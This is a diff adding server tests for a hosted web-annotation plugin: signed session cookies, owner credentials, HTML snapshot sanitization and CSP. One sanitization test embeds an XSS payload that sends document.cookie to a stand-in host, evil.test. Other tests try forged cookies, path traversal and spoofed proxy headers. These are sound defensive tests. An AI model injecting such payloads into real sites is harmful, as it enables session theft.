@@ -16,11 +16,16 @@ import zlib from 'node:zlib';
 import crypto from 'node:crypto';
 import { spawn } from 'node:child_process';
 import { fileURLToPath } from 'node:url';
+import { createRequire } from 'node:module';
 
 const TEST = path.dirname(fileURLToPath(import.meta.url));
 const PLUGIN = path.resolve(TEST, '..');
 const SERVER = path.join(PLUGIN, 'server.mjs');
 const MOCK = path.join(TEST, 'mock-bridge.mjs');
+const PLUGIN_DIR = PLUGIN;
+// the extension's own anchoring code, loaded exactly as the phone loads it
+const Anchor = createRequire(import.meta.url)(path.join(PLUGIN, 'extension', 'anchor.js'));
+const store_hasSnapshot = (dir, key) => fs.existsSync(path.join(dir, 'snapshots', `${key}.html`));
 
 // --- tiny runner --------------------------------------------------------
 let passed = 0;
@@ -46,9 +51,18 @@ function tmpRoot(tag) {
   const d = fs.mkdtempSync(path.join(os.tmpdir(), `bfp-${tag}-`));
   return d;
 }
+// Every server started by this file gets a throwaway secrets directory. The
+// owner credential is deliberately SHARED with the review hub's
+// (~/.botference/review-paper-secrets.json, identity.mjs), and a test must
+// never read — let alone generate into — the developer's real one.
+const SECRETS = fs.mkdtempSync(path.join(os.tmpdir(), 'bfp-secrets-'));
 function startServer({ root, args = [], env = {} }) {
   const proc = spawn(process.execPath, [SERVER, ...args], {
-    env: { ...process.env, PORT: '0', BOTFERENCE_PROJECT_ROOT: root, ...env },
+    env: {
+      ...process.env, PORT: '0', BOTFERENCE_PROJECT_ROOT: root,
+      BOTFERENCE_SECRETS_DIR: SECRETS, PLUGIN_OWNER_PASSWORD: '', REVIEW_HUB_PASSWORD: '',
+      ...env,
+    },
     stdio: ['ignore', 'pipe', 'pipe'],
   });
   spawned.push(proc);
@@ -1330,6 +1344,10 @@ async function main() {
     fs.mkdirSync(hostDir, { recursive: true });
     fs.writeFileSync(path.join(hostDir, 'config.json'),
       JSON.stringify({ vault_path: vault, export_folder: 'Web Clippings', author: 'angadh' }, null, 2));
+    // stand in for a review hub that has approved devices before (the real one
+    // writes this file the first time it signs a device in)
+    fs.writeFileSync(path.join(SECRETS, '.review-hub-device-secret'),
+      crypto.randomBytes(24).toString('hex'), { mode: 0o600 });
     const h = await startServer({
       root: hostRoot,
       args: ['--hosted'],
@@ -1424,7 +1442,8 @@ async function main() {
       assert.equal(good.status, 303);
       assert.equal(good.headers.location, '/pages');
       adaCookie = cookieJar(good);
-      assert.match(adaCookie, /plugin_auth=\d+\.guest\.[0-9a-f]{64}/);
+      assert.match(adaCookie, /plugin_auth=\d+\.guest\.ada-l\.[0-9a-f]{64}/,
+        'the NAME is inside the signature, not merely beside it');
       assert.match(adaCookie, /plugin_handle=ada-l/, 'the handle cookie is readable and sanitized');
       const listing = await GET(hb, '/pages', { ...REMOTE, cookie: adaCookie, accept: 'text/html' });
       assert.equal(listing.status, 200);
@@ -1594,6 +1613,47 @@ async function main() {
       assert.equal(refused.headers['access-control-allow-origin'], '*', 'including the 401, or the tab sees nothing');
     });
 
+    // --- the signed name: a guest is the name in their own cookie ---------
+    await test('a signed-in guest cannot rename themselves to another guest', async () => {
+      const r = await POST(hb, '/reply', { url: PAGE1, thread_id: '__page__', text: 'and who am I?' },
+        { ...REMOTE, cookie: adaCookie, 'x-plugin-handle': 'bob' });
+      assert.equal(r.status, 200);
+      assert.equal(r.json.msg.author, 'ada-l', 'the signed name wins over the claimed one');
+      const me = await GET(hb, '/whoami', { ...REMOTE, cookie: adaCookie, 'x-plugin-handle': 'bob' });
+      assert.equal(me.json.handle, 'ada-l');
+    });
+
+    await test('a cookie with the handle swapped out is worth nothing', async () => {
+      const [exp, role, , sig] = adaCookie.match(/plugin_auth=([^;]*)/)[1].split('.');
+      const forged = `plugin_auth=${exp}.${role}.bob.${sig}`;
+      const r = await GET(hb, '/whoami', { ...REMOTE, cookie: forged });
+      assert.equal(r.status, 401, 'the name is under the signature — moving it breaks it');
+    });
+
+    await test('a session in use renews itself, so the phone never meets the gate twice', async () => {
+      const fresh = await FORM(hb, '/auth', { handle: 'renewed', password: PW, next: '/pages' }, REMOTE);
+      const jar = cookieJar(fresh);
+      const young = await GET(hb, '/pages', { ...REMOTE, cookie: jar, accept: 'text/html' });
+      assert.equal(young.headers['set-cookie'], undefined, 'a young session is left alone');
+      // hand-age it past half its life by re-signing a nearer expiry
+      const half = Date.now() + 24 * 3600 * 1000; // well inside the 30-day TTL
+      const s = fs.readFileSync(path.join(hostDir, '.auth-secret'), 'utf8').trim();
+      const body = `${half}.guest.renewed`;
+      const aged = `plugin_auth=${body}.${crypto.createHmac('sha256', s).update(body).digest('hex')}`;
+      const old = await GET(hb, '/pages', { ...REMOTE, cookie: aged, accept: 'text/html' });
+      assert.equal(old.status, 200);
+      const reissued = (old.headers['set-cookie'] || []).join('; ');
+      assert.match(reissued, /plugin_auth=\d+\.guest\.renewed\./, 'it is handed back extended');
+      assert.ok(Number(reissued.match(/plugin_auth=(\d+)\./)[1]) > half, 'and further out than it was');
+    });
+
+    await test('sign out clears the session', async () => {
+      const r = await GET(hb, '/signout', { ...REMOTE, cookie: adaCookie });
+      assert.equal(r.status, 303);
+      assert.equal(r.headers.location, '/pages');
+      assert.match((r.headers['set-cookie'] || []).join('; '), /plugin_auth=; Max-Age=0/);
+    });
+
     await test('the reading room renders the quotes and messages for an authed guest', async () => {
       const list = await GET(hb, '/pages', { ...REMOTE, cookie: adaCookie, accept: 'text/html' });
       assert.match(list.body, new RegExp(`href="/p/${key}"`));
@@ -1633,7 +1693,235 @@ async function main() {
     });
 
     h.proc.kill();
+  }
 
+  // --- one owner identity, shared with the review docs --------------------
+  // No PLUGIN_OWNER_PASSWORD here, which is how it really runs: the owner
+  // credential comes from the review hub's own files (identity.mjs).
+  {
+    const idRoot = tmpRoot('identity');
+    const idDir = path.join(idRoot, '.botference', 'plugin');
+    fs.mkdirSync(idDir, { recursive: true });
+    fs.writeFileSync(path.join(idDir, 'config.json'),
+      JSON.stringify({ vault_path: vault, export_folder: 'Web Clippings', author: 'angadh' }, null, 2));
+    const idSecrets = fs.mkdtempSync(path.join(os.tmpdir(), 'bfp-idsec-'));
+    // a review hub that has approved devices before writes exactly this file
+    const DEVICE_SECRET = crypto.randomBytes(24).toString('hex');
+    fs.writeFileSync(path.join(idSecrets, '.review-hub-device-secret'), DEVICE_SECRET, { mode: 0o600 });
+    const g = await startServer({
+      root: idRoot,
+      args: ['--hosted', '--no-agents'],
+      env: { PLUGIN_PASSWORD: 'guest-pw', BOTFERENCE_SECRETS_DIR: idSecrets },
+    });
+    const gb = g.base;
+    const REMOTE2 = { host: 'plugin.botference.com' };
+    await POST(gb, '/page', { url: PAGE1, title: TITLE1, site: 'ledger.test' });
+
+    await test('the owner password is the review hub\'s own, generated where every paper reads it', async () => {
+      const file = path.join(idSecrets, 'review-paper-secrets.json');
+      const shared = JSON.parse(fs.readFileSync(file, 'utf8'));
+      assert.ok(shared.owner && String(shared.owner).length >= 16,
+        'one owner password, in the file hub.mjs hands to every paper as REVIEW_OWNER_PASSWORD');
+      assert.equal(fs.statSync(file).mode & 0o777, 0o600);
+      const r = await FORM(gb, '/auth', { handle: 'whoever', password: shared.owner, next: '/pages' }, REMOTE2);
+      assert.equal(r.status, 303);
+      const jar = cookieJar(r);
+      assert.match(jar, /plugin_auth=\d+\.owner\.angadh\./);
+      const me = await GET(gb, '/whoami', { ...REMOTE2, cookie: jar });
+      assert.deepEqual(me.json, { ok: true, hosted: true, owner: true, handle: 'angadh' });
+      assert.equal((await POST(gb, '/export', { url: PAGE1 }, { ...REMOTE2, cookie: jar })).status, 200,
+        'and the owner-only routes open to it, from the phone');
+    });
+
+    await test('a browser the review hub already approved is the owner, with nothing typed', async () => {
+      const mint = (exp, id, key = DEVICE_SECRET) =>
+        `${exp}.${id}.${crypto.createHmac('sha256', key).update(`${exp}.${id}`).digest('hex')}`;
+      const id = 'a1b2c3d4e5f6';
+      const good = `hub_device=${mint(String(Date.now() + 1e6), id)}`;
+      const me = await GET(gb, '/whoami', { ...REMOTE2, cookie: good });
+      assert.deepEqual(me.json, { ok: true, hosted: true, owner: true, handle: 'angadh' },
+        'a phone approved for review.botference.com is the owner at plugin.botference.com too');
+      assert.equal((await POST(gb, '/verbosity', { level: 'short' }, { ...REMOTE2, cookie: good })).status, 200);
+      // …and only genuinely signed, unexpired ones
+      const wrongKey = `hub_device=${mint(String(Date.now() + 1e6), id, 'f'.repeat(48))}`;
+      assert.equal((await GET(gb, '/whoami', { ...REMOTE2, cookie: wrongKey })).status, 401);
+      const expired = `hub_device=${mint(String(Date.now() - 1000), id)}`;
+      assert.equal((await GET(gb, '/whoami', { ...REMOTE2, cookie: expired })).status, 401);
+    });
+
+    await test('the guest password is still just a guest', async () => {
+      const r = await FORM(gb, '/auth', { handle: 'ada', password: 'guest-pw', next: '/pages' }, REMOTE2);
+      assert.equal(r.status, 303);
+      const jar = cookieJar(r);
+      assert.match(jar, /plugin_auth=\d+\.guest\.ada\./);
+      const me = await GET(gb, '/whoami', { ...REMOTE2, cookie: jar });
+      assert.equal(me.json.owner, false);
+      assert.equal((await POST(gb, '/export', { url: PAGE1 }, { ...REMOTE2, cookie: jar })).status, 403);
+    });
+
+    await test('localhost is still the owner here, with no cookie and no password', async () => {
+      const me = await GET(gb, '/whoami');
+      assert.deepEqual(me.json, { ok: true, hosted: true, owner: true, handle: 'angadh' });
+      // and the proxy-header hardening still decides it, not the socket
+      const viaTunnel = await GET(gb, '/whoami', { host: 'localhost', 'cf-connecting-ip': '203.0.113.9' });
+      assert.equal(viaTunnel.status, 401);
+    });
+
+    g.proc.kill();
+  }
+
+  // --- the article, readable (and markable) from a phone ------------------
+  {
+    const snapRoot = tmpRoot('snapshot');
+    const snapDir = path.join(snapRoot, '.botference', 'plugin');
+    fs.mkdirSync(snapDir, { recursive: true });
+    fs.writeFileSync(path.join(snapDir, 'config.json'),
+      JSON.stringify({ vault_path: vault, export_folder: 'Web Clippings', author: 'angadh' }, null, 2));
+    const s = await startServer({
+      root: snapRoot, args: ['--hosted', '--no-agents'],
+      env: { PLUGIN_PASSWORD: 'guest-pw' },
+    });
+    const sb = s.base;
+    const R = { host: 'plugin.botference.com' };
+    const key = crypto.createHash('sha1').update(PAGE1).digest('hex');
+    // the real fixture, as the extension would clone it: the whole article,
+    // scripts and styling and all
+    const fixture = fs.readFileSync(path.join(TEST, 'fixtures', 'article.html'), 'utf8');
+    const ARTICLE = /<article[^>]*>([\s\S]*?)<\/article>/.exec(fixture)[1];
+    // What the Mac's anchor.js indexes is the WHOLE page — site header, nav,
+    // footer and all — while the phone only ever sees the article. Standing in
+    // for buildTextIndex on both sides: strip the tags (and the non-prose
+    // elements it skips), leave the words.
+    const textOf = h => h
+      .replace(/<(script|style)[\s\S]*?<\/\1>/gi, ' ')
+      .replace(/<[^>]*>/g, ' ').replace(/&middot;/g, '·')
+      .replace(/&amp;/g, '&').replace(/&nbsp;/g, ' ').replace(/\s+/g, ' ').trim();
+    const WHOLE_PAGE = /<body[^>]*>([\s\S]*)<\/body>/.exec(fixture)[1];
+
+    await POST(sb, '/page', { url: PAGE1, title: TITLE1, site: 'ledger.test' });
+
+    let guestCookie = '';
+    await test('a guest cannot rewrite the article everyone else reads', async () => {
+      const jar = cookieJar(await FORM(sb, '/auth', { handle: 'ada', password: 'guest-pw', next: '/pages' }, R));
+      guestCookie = jar;
+      const r = await POST(sb, '/snapshot', { url: PAGE1, html: '<p>mine now</p>' }, { ...R, cookie: jar });
+      assert.equal(r.status, 403);
+      assert.equal(store_hasSnapshot(snapDir, key), false, 'and nothing was written');
+    });
+
+    await test('the owner\'s extension posts the article and it is sanitized on the way in', async () => {
+      const r = await POST(sb, '/snapshot', { url: PAGE1, html: ARTICLE });
+      assert.equal(r.status, 200);
+      assert.equal(r.json.stored, true);
+      assert.ok(r.json.bytes > 500, 'a real article arrived');
+      const onDisk = fs.readFileSync(path.join(snapDir, 'snapshots', `${key}.html`), 'utf8');
+      assert.ok(!/<script/i.test(onDisk), 'no script survived to disk');
+      assert.ok(!/ on[a-z]+=/i.test(onDisk), 'and no event handler either');
+      assert.ok(onDisk.includes('<p>'), 'the prose did');
+    });
+
+    await test('a snapshot posted with something nasty in it is defused, not stored raw', async () => {
+      const nasty = '<p>real prose</p><script>fetch("https://evil.test/"+document.cookie)</script>'
+        + '<img src=x onerror="alert(1)"><iframe src="https://evil.test/"></iframe>'
+        + '<a href="javascript:alert(1)">tap</a>';
+      const r = await POST(sb, '/snapshot', { url: PAGE1, html: nasty });
+      assert.equal(r.json.stored, true);
+      const onDisk = fs.readFileSync(path.join(snapDir, 'snapshots', `${key}.html`), 'utf8');
+      assert.equal(onDisk, '<p>real prose</p><a rel="noreferrer noopener" target="_blank">tap</a>');
+      // put the real article back for the rest of the block
+      await POST(sb, '/snapshot', { url: PAGE1, html: ARTICLE });
+    });
+
+    await test('the article view serves the prose under a strict CSP', async () => {
+      const r = await GET(sb, `/a/${key}`, { ...R, cookie: guestCookie, accept: 'text/html' });
+      assert.equal(r.status, 200);
+      const csp = r.headers['content-security-policy'];
+      assert.match(csp, /default-src 'none'/);
+      assert.match(csp, /script-src 'nonce-[A-Za-z0-9+/=]+'/, 'only scripts this page nonced');
+      assert.ok(!/unsafe-inline/.test(csp), 'never unsafe-inline');
+      assert.match(csp, /frame-ancestors 'none'/);
+      assert.ok(r.body.includes('Sleeper services'), 'the article is there');
+      assert.ok(r.body.includes('/assets/anchor.js'), 'anchored by the extension\'s own code');
+      assert.ok(r.body.includes('/assets/reader.js'));
+      const nonce = /script-src 'nonce-([^']+)'/.exec(csp)[1];
+      assert.ok(r.body.includes(`nonce="${nonce}"`), 'and the nonce actually reaches the tags');
+    });
+
+    await test('the extension\'s anchoring code is served to the phone verbatim', async () => {
+      const r = await GET(sb, '/assets/anchor.js', { ...R, cookie: guestCookie });
+      assert.equal(r.status, 200);
+      assert.match(r.headers['content-type'], /javascript/);
+      assert.equal(r.body, fs.readFileSync(path.join(PLUGIN_DIR, 'extension', 'anchor.js'), 'utf8'),
+        'byte for byte the same file the extension runs');
+      assert.equal((await GET(sb, '/assets/../server.mjs', { ...R, cookie: guestCookie })).status, 404,
+        'and nothing else is reachable through /assets');
+    });
+
+    await test('an unauthenticated visitor meets the gate, not the article', async () => {
+      const r = await GET(sb, `/a/${key}`, { ...R, accept: 'text/html' });
+      assert.equal(r.status, 401);
+      assert.match(r.body, /<form method="POST" action="\/auth">/);
+    });
+
+    // THE round-trip: a highlight made on the phone, against the snapshot,
+    // has to be findable in the page the Mac is looking at.
+    let phoneThread = null;
+    await test('a highlight made on the phone anchors in the original page', async () => {
+      const snapText = textOf(fs.readFileSync(path.join(snapDir, 'snapshots', `${key}.html`), 'utf8'));
+      const pageText = textOf(WHOLE_PAGE);
+      assert.ok(pageText.length > snapText.length + 40,
+        'the phone sees the article; the Mac sees the whole page around it');
+      assert.ok(pageText.includes('Infrastructure') && !snapText.includes('Infrastructure'),
+        'the site chrome is exactly the difference');
+      // the phone picks a sentence out of the snapshot, exactly as reader.js does
+      const at = snapText.indexOf('The economics');
+      assert.ok(at > 0, 'fixture sentence present');
+      const anchor = Anchor.buildAnchor(snapText, at, at + 60);
+      const r = await POST(sb, '/thread', {
+        url: PAGE1, quote: anchor.quote, prefix: anchor.prefix, suffix: anchor.suffix,
+        msg: { text: 'read this on the train' },
+      }, { ...R, cookie: guestCookie });
+      assert.equal(r.status, 200);
+      phoneThread = r.json.thread;
+      assert.equal(phoneThread.msgs[0].author, 'ada', 'authored by whoever made it');
+      // …and now the Mac, looking at the untouched article, finds it
+      const found = Anchor.locate(pageText, phoneThread);
+      assert.equal(found.ok, true, 'the extension would re-anchor this thread');
+      assert.equal(pageText.slice(found.start, found.end).replace(/\s+/g, ' '),
+        phoneThread.quote.replace(/\s+/g, ' '), 'and land on the very same words');
+    });
+
+    await test('the phone-made thread is an ordinary thread everywhere else', async () => {
+      const page = (await GET(sb, `/page?url=${encodeURIComponent(PAGE1)}`)).json;
+      assert.ok(page.threads.some(t => t.id === phoneThread.id));
+      const conv = await GET(sb, `/p/${key}`, { ...R, cookie: guestCookie, accept: 'text/html' });
+      assert.ok(conv.body.includes('read this on the train'));
+      assert.match(conv.body, new RegExp(`href="/a/${key}"`), 'and the conversation links to the article');
+      const list = await GET(sb, '/pages', { ...R, cookie: guestCookie, accept: 'text/html' });
+      assert.match(list.body, new RegExp(`href="/a/${key}"`), 'the list opens the article itself now');
+    });
+
+    await test('a page with no snapshot degrades to an explanation, not a broken view', async () => {
+      await POST(sb, '/page', { url: PAGE2, title: 'Unsnapped', site: 'x.test' });
+      const k2 = crypto.createHash('sha1').update(PAGE2).digest('hex');
+      const r = await GET(sb, `/a/${k2}`, { ...R, cookie: guestCookie, accept: 'text/html' });
+      assert.equal(r.status, 200);
+      assert.match(r.body, /No readable copy of this article has been captured yet/);
+      assert.match(r.body, /Open it once on the Mac/, 'and says what fixes it');
+      assert.match(r.body, new RegExp(`href="/p/${k2}"`), 'with the comments still one tap away');
+      assert.ok(!r.body.includes('/assets/reader.js'), 'no reader where there is nothing to read');
+    });
+
+    await test('deleting the page takes its snapshot with it', async () => {
+      await POST(sb, '/delete-page', { url: PAGE1 });
+      assert.equal(store_hasSnapshot(snapDir, key), false);
+      assert.equal((await GET(sb, `/a/${key}`, { ...R, cookie: guestCookie })).status, 404);
+    });
+
+    s.proc.kill();
+  }
+
+  {
     await test('--hosted without PLUGIN_PASSWORD refuses to start', async () => {
       const bare = tmpRoot('nopw');
       const proc = spawn(process.execPath, [SERVER, '--hosted'], {
